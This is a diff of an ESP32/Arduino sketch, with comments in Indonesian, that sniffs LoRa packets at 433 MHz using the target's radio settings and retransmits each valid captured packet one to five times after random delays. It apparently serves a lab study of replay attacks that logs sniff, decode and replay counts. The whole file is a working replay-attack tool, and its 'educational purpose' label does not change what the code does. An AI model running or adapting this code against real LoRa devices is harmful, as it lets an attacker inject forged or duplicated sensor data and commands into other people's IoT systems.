@@ -1,16 +1,17 @@
 /*
-ATTACKER / REPLAY ATTACK LoRa (AES FORMAT)
--------------------------------------------------
+ATTACKER / SNIFFER + RANDOM REPLAY LoRa
+--------------------------------
 Author: Mohammad Rizki Fadillah
 
-Replay Attack:
-- Sniff packet AES
-- Simpan ciphertext
-- Replay packet berkala
+Description:
+- Menyadap paket LoRa
+- Replay otomatis setiap paket yang berhasil ditangkap
+- Jumlah replay random (1-5x)
+- Delay replay random
+- Simulasi replay attack lebih realistis
 
-Format output dibuat konsisten
-dengan Passive Sniffer / Receiver.
--------------------------------------------------
+FOR EDUCATIONAL PURPOSE ONLY
+--------------------------------
 */
 
 #include <SPI.h>
@@ -20,52 +21,56 @@ dengan Passive Sniffer / Receiver.
 #define RST  14
 #define DIO0 26
 
-// ===== PARAM =====
+// =====================================
+// PARAMETER
+// =====================================
 const uint32_t EXPECTED = 200;
 
-const unsigned long REPLAY_INTERVAL = 7000;
-const unsigned long TIMEOUT_MS      = 60000;
+const unsigned long TIMEOUT_MS = 30000;
 
-// ===== METRICS =====
+// =====================================
+// METRICS
+// =====================================
 uint32_t sniffedCount   = 0;
 uint32_t decodedCount   = 0;
 uint32_t invalidCount   = 0;
-
-uint32_t duplicateCount = 0;
-uint32_t uniqueCount    = 0;
-
 uint32_t replayedCount  = 0;
 
-uint32_t totalBytes = 0;
+// =====================================
+// UNIQUE TRACKER
+// =====================================
+bool seen[EXPECTED] = {false};
 
-// ===== TIME =====
-unsigned long firstRecvTime  = 0;
-unsigned long lastRecvTime   = 0;
-unsigned long lastReplayTime = 0;
+uint32_t uniqueCount    = 0;
+uint32_t duplicateCount = 0;
 
-// ===== STATE =====
+// =====================================
+// STATE
+// =====================================
+unsigned long lastRecvTime = 0;
+
 bool started = false;
 bool done    = false;
 
-// ===== STORAGE =====
-String lastPacket = "";
-
-// ===== UNIQUE TRACK =====
-bool seen[EXPECTED] = {false};
-
-// =====================================================
+// =====================================
 // VALIDASI PAYLOAD
-// =====================================================
+// =====================================
 bool isValidPayload(String data, uint32_t &id) {
 
   int p1 = data.indexOf(',');
+  int p2 = data.indexOf(',', p1 + 1);
 
-  if (p1 == -1) return false;
+  if (p1 == -1 || p2 == -1) {
+    return false;
+  }
 
   String idStr = data.substring(0, p1);
 
+  // cek numeric
   for (int i = 0; i < idStr.length(); i++) {
-    if (!isDigit(idStr[i])) return false;
+    if (!isDigit(idStr[i])) {
+      return false;
+    }
   }
 
   id = idStr.toInt();
@@ -73,113 +78,110 @@ bool isValidPayload(String data, uint32_t &id) {
   return true;
 }
 
-// =====================================================
+// =====================================
 // SUMMARY
-// =====================================================
+// =====================================
 void printSummary() {
 
-  float pdr =
-      (EXPECTED > 0)
-      ? (uniqueCount * 100.0 / EXPECTED)
-      : 0;
-
-  float packetLoss = 100.0 - pdr;
-
-  float durationSec =
-      (lastRecvTime - firstRecvTime) / 1000.0;
-
-  float throughput =
-      (durationSec > 0)
-      ? ((totalBytes * 8.0) / durationSec)
-      : 0;
+  float sniffRate =
+    (sniffedCount * 100.0) / EXPECTED;
 
   float decodeRate =
-      (sniffedCount > 0)
-      ? ((decodedCount * 100.0) / sniffedCount)
-      : 0;
+    (sniffedCount > 0)
+    ? ((decodedCount * 100.0) / sniffedCount)
+    : 0;
 
-  Serial.println("\n=== RESULT REPLAY ATTACK ===");
+  float packetLoss =
+    100.0 - sniffRate;
 
-  Serial.print("Sniffed Total: ");
+  Serial.println("\n========== ATTACK SUMMARY ==========");
+
+  Serial.print("Sniffed Total     : ");
   Serial.println(sniffedCount);
 
-  Serial.print("Decoded Valid: ");
+  Serial.print("Decoded Valid     : ");
   Serial.println(decodedCount);
 
-  Serial.print("Invalid: ");
+  Serial.print("Invalid Payload   : ");
   Serial.println(invalidCount);
 
-  Serial.print("Unique: ");
+  Serial.print("Unique Packet     : ");
   Serial.println(uniqueCount);
 
-  Serial.print("Duplicate: ");
+  Serial.print("Duplicate Packet  : ");
   Serial.println(duplicateCount);
 
-  Serial.print("Replay Sent: ");
+  Serial.print("Replay Sent Total : ");
   Serial.println(replayedCount);
 
-  Serial.print("PDR (%): ");
-  Serial.println(pdr, 2);
+  Serial.print("Sniff Success (%) : ");
+  Serial.println(sniffRate);
 
-  Serial.print("Packet Loss (%): ");
-  Serial.println(packetLoss, 2);
+  Serial.print("Packet Loss (%)   : ");
+  Serial.println(packetLoss);
 
-  Serial.print("Decode Success (%): ");
-  Serial.println(decodeRate, 2);
+  Serial.print("Decode Success(%) : ");
+  Serial.println(decodeRate);
 
-  Serial.print("Throughput (bps): ");
-  Serial.println(throughput, 2);
+  Serial.println("====================================");
 }
 
-// =====================================================
+// =====================================
 // SETUP
-// =====================================================
+// =====================================
 void setup() {
 
   Serial.begin(115200);
+
+  // random seed
+  randomSeed(analogRead(34));
 
   SPI.begin(18, 19, 23, SS);
 
   LoRa.setPins(SS, RST, DIO0);
 
-  if (!LoRa.begin(433000000)) {
+  if (!LoRa.begin(433E6)) {
 
     Serial.println("LoRa init FAILED!");
 
     while (1);
   }
 
+  // samain config target
   LoRa.setSpreadingFactor(7);
+
   LoRa.setSignalBandwidth(125E3);
+
   LoRa.setCodingRate4(5);
 
   LoRa.receive();
 
-  Serial.println("Replay Attack AES Ready...");
+  Serial.println("====================================");
+  Serial.println("ATTACKER READY");
+  Serial.println("MODE : RANDOM REPLAY ATTACK");
+  Serial.println("Replay : 1-5x Random");
+  Serial.println("====================================\n");
 }
 
-// =====================================================
-// LOOP
-// =====================================================
+// =====================================
+// MAIN LOOP
+// =====================================
 void loop() {
 
-  if (done) return;
+  if (done) {
+    return;
+  }
 
+  // =====================================
+  // SNIFF PACKET
+  // =====================================
   int packetSize = LoRa.parsePacket();
 
-  // =================================================
-  // RECEIVE / SNIFF
-  // =================================================
   if (packetSize) {
 
-    unsigned long tRecv = millis();
+    started = true;
 
-    if (!started) {
-      firstRecvTime = tRecv;
-      started = true;
-    }
-
-    lastRecvTime = tRecv;
+    lastRecvTime = millis();
 
     sniffedCount++;
 
@@ -189,8 +191,9 @@ void loop() {
       data += (char)LoRa.read();
     }
 
-    totalBytes += data.length();
-
+    // =====================================
+    // VALIDASI
+    // =====================================
     uint32_t id = 0;
 
     bool valid = isValidPayload(data, id);
@@ -202,34 +205,35 @@ void loop() {
       if (id < EXPECTED) {
 
         if (!seen[id]) {
+
           seen[id] = true;
+
           uniqueCount++;
-        }
-        else {
+
+        } else {
+
           duplicateCount++;
         }
       }
 
-      // simpan packet valid terakhir
-      lastPacket = data;
-    }
-    else {
+    } else {
+
       invalidCount++;
     }
 
-    // =================================================
-    // FORMAT LOG
-    // =================================================
-    Serial.print("└─> [SNIFF] ");
+    // =====================================
+    // LOG SNIFF
+    // =====================================
+    Serial.print("[SNIFF] ");
+
     Serial.print(data);
 
-    Serial.print(" | SIZE=");
-    Serial.print(data.length());
-
     Serial.print(" | RSSI=");
+
     Serial.print(LoRa.packetRssi());
 
     Serial.print(" | SNR=");
+
     Serial.print(LoRa.packetSnr());
 
     if (!valid) {
@@ -238,9 +242,62 @@ void loop() {
 
     Serial.println();
 
-    // =================================================
-    // AUTO DONE
-    // =================================================
+    // =====================================
+    // RANDOM REPLAY ATTACK
+    // =====================================
+    if (valid && data != "") {
+
+      // random replay 1-5x
+      int replayTimes = random(1, 6);
+
+      Serial.print("[ATTACK] Replay Count = ");
+
+      Serial.println(replayTimes);
+
+      for (int i = 0; i < replayTimes; i++) {
+
+        // delay random
+        // tetap aman < 8 detik total
+        int randomDelay =
+          random(300, 900);
+
+        delay(randomDelay);
+
+        replayedCount++;
+
+        Serial.print("[REPLAY ");
+
+        Serial.print(i + 1);
+
+        Serial.print("/");
+
+        Serial.print(replayTimes);
+
+        Serial.print("] Delay=");
+
+        Serial.print(randomDelay);
+
+        Serial.print("ms | ");
+
+        Serial.println(data);
+
+        // =====================================
+        // KIRIM ULANG PACKET
+        // =====================================
+        LoRa.beginPacket();
+
+        LoRa.print(data);
+
+        LoRa.endPacket();
+
+        // balik lagi receive
+        LoRa.receive();
+      }
+    }
+
+    // =====================================
+    // STOP KALO TARGET TERCAPAI
+    // =====================================
     if (sniffedCount >= EXPECTED) {
 
       printSummary();
@@ -249,46 +306,16 @@ void loop() {
     }
   }
 
-  // =================================================
-  // REPLAY ATTACK
-  // =================================================
-  if (started &&
-      !done &&
-      lastPacket != "") {
-
-    if (millis() - lastReplayTime >= REPLAY_INTERVAL) {
-
-      if (millis() - lastRecvTime <= TIMEOUT_MS) {
-
-        lastReplayTime = millis();
-
-        replayedCount++;
-
-        Serial.print("└─> [REPLAY] ");
-        Serial.print(lastPacket);
-
-        Serial.print(" | SIZE=");
-        Serial.println(lastPacket.length());
-
-        LoRa.beginPacket();
-        LoRa.print(lastPacket);
-        LoRa.endPacket();
-
-        LoRa.receive();
-      }
-    }
-  }
-
-  // =================================================
+  // =====================================
   // TIMEOUT
-  // =================================================
-  if (started &&
-      !done &&
-      (millis() - lastRecvTime > TIMEOUT_MS)) {
+  // =====================================
+  if (
+    started &&
+    !done &&
+    (millis() - lastRecvTime > TIMEOUT_MS)
+  ) {
 
-    Serial.println(
-      "\n[TIMEOUT] 60 detik tidak ada paket baru"
-    );
+    Serial.println("\n[TIMEOUT] No new packet 30s");
 
     printSummary();
 
